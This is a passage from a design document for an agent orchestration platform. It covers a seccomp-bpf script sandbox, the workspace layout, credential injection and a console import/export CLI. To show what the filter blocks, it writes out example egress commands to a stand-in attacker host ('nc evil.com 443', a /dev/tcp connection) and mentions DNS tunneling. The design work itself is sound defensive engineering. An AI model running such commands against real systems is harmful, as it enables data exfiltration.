| `temperature` | Per-agent override. Supervisor needs 0.2; creative reviewer may want 0.5. |
| `max_tokens` | Output length control per agent role. |

---

## 18. Sandbox — Secure Script Execution

The sandbox executes scripts (Python, Bash, Node) generated by agents or skills.
It runs as a standalone microservice (`flowgent sandbox start`), consuming trigger
messages from the queue and reading/writing files through a shared workspace volume.

### 18.1 Dual Persistence Model

| Type | Storage | Survives | Example |
|------|---------|----------|---------|
| **Work data** (files) | Workspace volume (PVC) | Pod restart, cluster reboot | Code patches, scripts, build artifacts |
| **Shared memory** (knowledge) | Storage (SQLite / PostgreSQL) | Everything | Agent conversation history, run progress |

### 18.2 Workspace Path Convention

```
{workspace}/{namespaceId}/{flowId}/{runId}/{taskId}/
  ├── script.{py,sh,js}
  ├── input.json
  ├── result.json
  ├── status
  └── original/   (pre-modification snapshot)
```

### 18.3 Security Policy — 3-Level Override

| Level | Config Source | Scope |
|-------|--------------|-------|
| Global | `flowgent.yaml` → `sandbox.policy` | All sandbox executions |
| Flow | `AgentFlowSpec.sandbox_policy` | All nodes in a flow |
| Node | `Node.network_policy` | Single node |

Resolution: node override > flow override > global default. See
`model.EffectiveNetworkPolicy()`.

### 18.4 Network Isolation — seccomp-bpf + Userspace Notifier

**Why not iptables / Istio / K8s NetworkPolicy?**

Network policy is defined per-flow per-node. The same sandbox pod executes scripts
for different flows concurrently. All pod-level mechanisms are **static** — they apply
uniformly to every process in the pod from the moment the pod starts:

| Mechanism | Level | Dynamic per-execution? | Escape vector |
|-----------|-------|----------------------|---------------|
| iptables | pod netns | No — rules apply to all processes | Process with `NET_ADMIN` can delete rules |
| Istio/envoy sidecar | pod | No — sidecar injected at pod creation | Process can delete iptables redirect rules |
| K8s NetworkPolicy | pod | No — enforced by CNI at pod boundary | Process inside pod is already past the boundary |
| ALL_PROXY env | process | Yes, but advisory only | `unset ALL_PROXY; nc evil.com 443` |
| **seccomp-bpf + notifier** | **per-thread** | **Yes — filter installed before each script** | **Kernel-enforced, process cannot remove** |

**Architecture:**

```
SandboxRunner (Go process)
  │
  ├─→ Before each script execution:
  │     1. Pre-resolve allowlist hostnames → IPs
  │        (e.g. nexus3:8081 → 10.43.162.201:8081)
  │     2. Build seccomp-bpf filter program:
  │        - Block socket(AF_INET, SOCK_RAW, *)       → EPERM
  │        - Block bpf(), init_module(), kexec_load() → EPERM
  │        - sendto/sendmsg/sendmmsg to port 53       → ALLOW (DNS)
  │        - connect/sendto/sendmsg/sendmmsg          → USER_NOTIF
  │        - Everything else                          → ALLOW
  │     3. Install filter via seccomp(SECCOMP_SET_MODE_FILTER,
  │        SECCOMP_FILTER_FLAG_TSYNC)
  │
  ├─→ Start notifier goroutine:
  │     - Reads seccomp notify fd
  │     - For each SECCOMP_RET_USER_NOTIF event:
  │       - Read /proc/<pid>/mem at args[1] to get sockaddr
  │       - If (ip, port) in allowlist → SECCOMP_USER_NOTIF_FLAG_CONTINUE
  │       - Else → respond with error (EPERM)
  │
  ├─→ exec.Command("bash", scriptFile)    ← child inherits filter
  │     - Script calls curl nexus3:8081
  │     → glibc: getaddrinfo("nexus3") → DNS lookup (UDP 53, allowed by BPF)
  │     → glibc: connect(fd, {10.43.162.201, 8080})
  │     → Kernel seccomp: USER_NOTIF → notifier checks IP+port → ALLOW
  │     → Script calls nc evil.com 443
  │     → Kernel seccomp: USER_NOTIF → notifier checks IP+port → DENY (EPERM)
  │
  └─→ After script exits:
        - Child process dies → filter auto-released (no cleanup needed)
        - Notifier goroutine exits
```

**Syscall coverage — every egress path blocked:**

| Syscall | Protocol | Intercepted? | Notes |
|---------|----------|-------------|-------|
| `connect()` | TCP (and UDP with connected socket) | Yes — BPF sends to notifier | Most common path (curl, wget, http clients) |
| `sendto()` | UDP (and TCP fast-path) | Yes — BPF sends to notifier | DNS allowed unconditionally (port 53) |
| `sendmsg()` | UDP/TCP with scatter-gather | Yes — BPF sends to notifier | Used by sendmmsg, advanced socket APIs |
| `sendmmsg()` | Batch sendmsg | Yes — BPF sends to notifier | Same check as sendmsg |
| `socket()` | Socket creation | Yes — BPF blocks SOCK_RAW directly | Prevents raw IP packet injection |
| `exec 3<>/dev/tcp/h/p` | Bash TCP pseudo-device | Yes — bash internally calls connect() | No special handling needed |
| `bpf()` | BPF syscall | Yes — blocked unconditionally | Prevents process from installing its own seccomp |
| `init_module()` | Kernel module load | Yes — blocked unconditionally | Privilege escalation prevention |
| `kexec_load()` | Kernel execution | Yes — blocked unconditionally | Privilege escalation prevention |
| `perf_event_open()` | Performance monitoring | Yes — blocked unconditionally | Can be used for side-channel attacks |

**DNS — why it's unconditionally allowed at the BPF level:**

Standard DNS resolution in glibc uses `sendto()` with the resolver address (e.g.,
`127.0.0.1:53` or the pod's DNS server). The target address is passed directly in
the syscall arguments, not through a prior `connect()`. Allowing `sendto`/`sendmsg`
to port 53 lets the script resolve hostnames. The actual TCP/UDP connections to
the resolved IPs are then checked by the notifier.

This means hostname leak via DNS queries IS possible (the script can `dig` any
domain). But the actual data exfiltration connection is blocked at the `connect()`
level. If DNS exfiltration itself is a concern (TXT record tunneling, ~200 bytes
per query), the DNS port can be restricted to specific resolver IPs in the future.

**Why not `SECCOMP_RET_TRAP` (SIGSYS)?** SIGSYS kills the process. For network
filtering, we need "allow some, deny others" — USER_NOTIF is the only mechanism
that can inspect arguments and make a per-call decision without killing the process.

**Why not `SECCOMP_RET_ERRNO` directly?** ERRNO returns immediately without
inspecting the target address. We can't distinguish `nexus3:8081` (allowed) from
`evil.com:443` (denied) without reading the sockaddr.

**Docker mode:** When `sandbox.image` is configured, the Docker container runs with
`--network=none` plus the seccomp filter as an additional layer. The seccomp filter
is still installed on the docker/docker process that spawns the container, providing
defense-in-depth.

**Process mode (no Docker):** seccomp filter is the primary and only enforcement
mechanism. Installed on the child process via `exec.Cmd.SysProcAttr`.

### 18.5 Sandbox Execution Model (Independent Pods + Shared Volume)

The sandbox subsystem spans two Go modules communicating via MQTT and a shared PVC:

```
TM Pod (SandboxExecutor)                Sandbox Pod (SandboxRunner)
─────────────────────────               ─────────────────────────
  → Build workspace path                  → $share/sandbox-pool subscribe
  → Write script to shared PVC            → Dequeue trigger via MQTT
  → Snapshot originals                    → Read script from shared PVC
  → Publish trigger ───MQTT──→           → BuildFilter(network_policy)
    topic: .../sandbox/trigger            → Install seccomp (TSYNC)
    {namespace}/{flowId}/{runId}             → Start notifier goroutine
  → Subscribe result ←──MQTT──           → Execute: bash/python3/node
    topic: .../sandbox/result             → Wait for child process exit
    {namespace}/{flowId}/{runId}             → Notifier auto-exits
  → Read result.json from PVC            → Write result.json + status to PVC
                                           → Publish result ───MQTT──→
```

In distributed mode, sandbox pods use `$share/sandbox-pool` shared subscription for
load-balanced trigger consumption. The trigger topic contains `{namespace}/{flowId}/{runId}`
so multiple runs don't interfere. Results use point-to-point routing via the same
`{namespace}/{flowId}/{runId}` suffix — only the originating TM slot subscribes.

The `SandboxTrigger` struct is defined in `model` so both sides share the contract
without Go import coupling. The sandbox pod's K8s Deployment is created and scaled
by JM's K8sRM — the same goroutine pattern used for TM pods.

```
Sandbox Worker (per-execution lifecycle, running in sandbox pod):
  → $share/sandbox-pool dequeue trigger
  → Read script from shared workspace PVC
  → Pre-resolve allowlist hosts → IPs
  → Build seccomp-bpf filter from resolved IPs + port list
  → Install filter (SECCOMP_FILTER_FLAG_TSYNC)
  → Start notifier goroutine (reads seccomp notify fd)
  → Execute: bash/python3/node script.sh
  → Wait for child process exit
  → Notifier auto-exits (filter dies with child)
  → Write result.json + status to shared PVC
  → Push result to MQTT: flowgent/v1/{namespace}/flows/{flowId}/runs/{runId}/sandbox/result
```


### 18.6 Workspace — Unified PVC Design

Both session and application modes use a **ReadWriteMany PVC** for the sandbox
workspace, provisioned once and shared across all sandbox pods.

```tree
/var/flowgent/
├── {namespaceId}/
│   └── {flowId}/
│       └── {runId}/
│           └── {taskId}/
│               ├── script.sh           ← written by SandboxExecutor
│               ├── input.json          ← written by SandboxExecutor
│               ├── result.json         ← written by SandboxRunner
│               ├── status
│               └── original/
```

| Mode | Workspace Path | Provisioning |
|------|---------------|-------------|
| Session | `/var/flowgent/{namespaceId}/{flowId}/{runId}/{taskId}/` | PVC/hostPath (Helm pre-creates mount source) |
| Application | `/var/flowgent/{namespaceId}/{flowId}/{runId}/{taskId}/` | PVC/hostPath (same path convention) |
| All-in-one | `os.TempDir()` | Process-local |

Both modes use the same path convention — different namespaces and flows are
isolated by subdirectory, not by separate volumes.

### 18.7 Credential Injection

External service credentials are injected into JM/TM/Sandbox pods via the K8s
Secret named in `runtime.credential_env_secret`. Sandbox child processes inherit
the sandbox pod environment during script execution:

```yaml
# flowgent.yaml
runtime:
  credential_env_secret: flowgent-runtime-env
```

```bash
# Create secrets once per cluster
kubectl create secret generic flowgent-runtime-env \
  --from-literal=GITHUB_TOKEN=... \
  --from-literal=SONARQUBE_TOKEN=...
```

- The sandbox runner passes all env vars to child processes:

```go
cmd.Env = append(os.Environ(), "HOME=/tmp", "SANDBOX_MODE=1")
```

- Scripts read credentials directly from env:

```bash
curl -u "${NEXUS3_USER}:${NEXUS3_PASSWORD}" "$NEXUS3_URL/..."
```

Secrets never appear in flow YAML or workspace files.

### 18.8 CLI

```bash
# Start sandbox as standalone process
./bin/flowgent-sandbox -c etc/flowgent.yaml

# Or as part of all-in-one (embedded runner, no separate process)
./bin/flowgent -c etc/flowgent.yaml
```

---

## 19. Directory-Based Configuration

### 19.1 Config Layout

```yaml
orchestration:
  mcps: [...]
  agents:
    static:  { enabled: true, load-dir: "agents/",  refresh: 30s }
    standard: { enabled: false }   # DB-backed (future UI)
  skills:
    static:  { enabled: true, load-dir: "skills/",  refresh: 30s }
    standard: { enabled: false }
  agentflows:
    static:  { enabled: true, load-dir: "flows/",   refresh: 1m }
    standard: { enabled: false }
```

### 19.2 Directory Layout

- Default Static Manifest defintions

```tree
etc/
├── flowgent.yaml
└── {UseCase}/
    ├── agents/              # 01-supervisor.yaml, 02-issue-detector.yaml, ...
    ├── flows/               # 01-security-autonomy-fixer.yaml, ...
    └── skills/              # 01-dependency-scan.yaml, ...
```

`01-` prefix is a convention for human readability and deterministic load order. The loader sorts files alphabetically.

### 19.3 Static Manifest Loader

```go
func loadResourceDir[T any](dir string) ([]T, error) {
    entries, _ := os.ReadDir(dir)
    var result []T
    for _, e := range entries {
        if e.IsDir() || filepath.Ext(e.Name()) != ".yaml" { continue }
        data, _ := os.ReadFile(filepath.Join(dir, e.Name()))
        var item T
        yaml.Unmarshal(data, &item)
        result = append(result, item)
    }
    return result, nil
}
```

---

## 20. Flowgent Console — Resource Management CLI

The `flowgent console` is the offline resource management tool for Flowgent.
It provides import/export and CRUD for all resource kinds, enabling seamless
migration between environments (dev → staging → production) and backup/restore
workflows.

### 20.1 Architecture

```
┌──────────────────────────────────────────────────────────────────┐
│                    Flowgent Console (REPL)                        │
│                                                                   │
│  ┌──────────┐  ┌──────────┐  ┌──────────┐  ┌──────────────────┐ │
│  │  Export   │  │  Import  │  │   CRUD   │  │   Lazy Stores    │ │
│  │  Engine   │  │  Engine  │  │  (list/  │  │   (agents, flows, │ │
│  │  (YAML/   │  │  (YAML/  │  │   get/   │  │    runs, channels,│ │
│  │   JSON)   │  │   JSON)  │  │   add/   │  │    llm, mcps)     │ │
│  │           │  │          │  │  remove) │  │                   │ │
│  └─────┬─────┘  └────┬─────┘  └────┬─────┘  └────────┬──────────┘ │
│        │              │             │                  │            │
│        └──────────────┴─────────────┴──────────────────┘            │
│                              │                                     │
│                     FlowgentConsole                                │
│                    (lazy store init)                               │
│                              │                                     │
│                     ┌────────┴────────┐                            │
│                     │    IStore (DB)  │                            │
│                     │  PG / SQLite    │                            │
│                     └─────────────────┘                            │
└──────────────────────────────────────────────────────────────────┘
```

### 20.2 Supported Resource Kinds

| Kind | CLI Name | REST Endpoint | Export | Import | CRUD (list/get/add/remove) |
|------|----------|---------------|--------|--------|---------------------------|
| Agent | `agent` | `/api/v1/{namespace}/agents` | yes | yes | yes |
| MCP | `mcp` | `/api/v1/{namespace}/mcp` | yes | yes | yes |
| LLMProvider | `llm` | `/api/v1/{namespace}/llm/providers` | yes | yes | yes |
| NotifyChannel | `channel` | `/api/v1/{namespace}/notifications/channels` | yes | yes | yes |
| Skill (Flow with kind=skill) | `skill` | (no REST endpoint — import/console only) | yes | yes | yes |
| AgentFlow | `flow` | `/api/v1/{namespace}/flows` | yes | yes | yes |
| FlowRun | `flowrun` | `/api/v1/{namespace}/runs` | yes | yes | yes |
| Wallet (Ed25519 keypair) | `wallet` | — | **never exported** | yes | yes |

### 20.3 Import/Export Design

**Golden rule**: Export → Import must be seamless and lossless. Resources
exported from one Flowgent instance must re-import cleanly into another,
regardless of backend (PG → SQLite or vice versa).

**Wallet exclusion**: Wallet private keys are never exported — they can only
be imported or generated via `wallet add`. This prevents accidental credential
leakage in backup files. The `ExportData` struct still carries a `Wallets`
field for backward-compatible import from older archives.

**Output format** is auto-detected from file extension:
`.json` → JSON (indented), `.yaml`/`.yml` → YAML.

### 20.4 CLI Usage

```bash
# Interactive REPL
flowgent console -c etc/flowgent.yaml

# Batch export — all resource kinds (wallets excluded)
flowgent console -c etc/flowgent.yaml -- export --output /tmp/backup.yaml

# Batch export — filtered by kind
flowgent console -c etc/flowgent.yaml -- export \
  --kind mcp,llm,agent,flow,flowrun,skill,channel \
  --output /tmp/flowgent_data.json

# Import from files/directories (supports glob patterns)
flowgent console -c etc/flowgent.yaml -- import config/agents/*.yaml
flowgent console -c etc/flowgent.yaml -- import config/mcps/
flowgent console -c etc/flowgent.yaml -- import /tmp/backup.yaml
```

### 20.5 Import File Format — K8s-Style Single Resource

Each YAML/JSON file uses a Kubernetes-style `apiVersion`/`kind`/`metadata`/`spec`
wrapper. This is the canonical format for per-resource YAML files in Flowgent
config directories:

```yaml
apiVersion: console.flowgent.io/v1
kind: MCP
metadata:
  name: sonarqube
  namespace: default
  labels:
    catalog: security,code-quality
  status: active
  description: SonarQube MCP server for SAST issue scanning
spec:
  enabled: true
  type: http
  url: http://172.29.235.101:18080/mcp
```

Valid `kind` values: `Agent`, `MCP`, `LLMProvider`, `Flow`, `FlowRun`, `Skill`,
`NotifyChannel`. The `spec` block is the raw entity payload — identical to what
the REST API accepts.

### 20.6 Import File Format — Bulk ExportData

For full backups, the export produces a single file containing all resources in
a top-level container:

```yaml
llms:
  - id: deepseek
    provider: deepseek
    model: deepseek-chat
    ...
mcps:
  - name: github
    enabled: true
    type: http
    url: https://api.githubcopilot.com/mcp/
    ...
agents:
  - name: supervisor
    model: deepseek/deepseek-chat
    soul: ...
    ...
agentFlows:
  - id: security-autonomy-fixer
    kind: flow
    nodes: [...]
    edges: [...]
skills:
  - id: nexus3-retrieval
    kind: skill
    nodes: [...]
    edges: [...]
flowRuns:
  - id: run-abc123
    agentFlowID: security-autonomy-fixer
    status: COMPLETED
    ...
channels:
  - id: slack-alerts
    type: slack
    ...
wallets: []  # always empty on export; preserved for backward-compatible import
```

This format supports seamless re-import: `ImportAll()` iterates each section
and writes to the corresponding store.

### 20.7 E2E Migration Workflow

```bash
# 1. Export from production
flowgent console -c etc/prod.yaml -- export --output /tmp/prod-export.yaml

# 2. Import to staging (validates the exported file)
flowgent console -c etc/staging.yaml -- import /tmp/prod-export.yaml

# 3. Or — import individual resource files from a config directory
flowgent console -c etc/dev.yaml -- import \
  usecase/security-autonomy-fixer/config/agents/ \
  usecase/security-autonomy-fixer/config/flows/ \
  usecase/security-autonomy-fixer/config/mcps/ \
  usecase/security-autonomy-fixer/config/skills/
```

### 20.8 Module Dependency

`console` depends on `config` (FlowgentConfig), `model` (entities), `store`
(database access), and `wallet` (secret store for Ed25519 keys). It sits at
the same level as `core` in the dependency graph — both are mid-tier modules
that `cmd` orchestrates. See §15 for the full module table.

```
config + model + store + wallet
         ↑
       console
         ↑
        cmd (→ everything, including console)
```
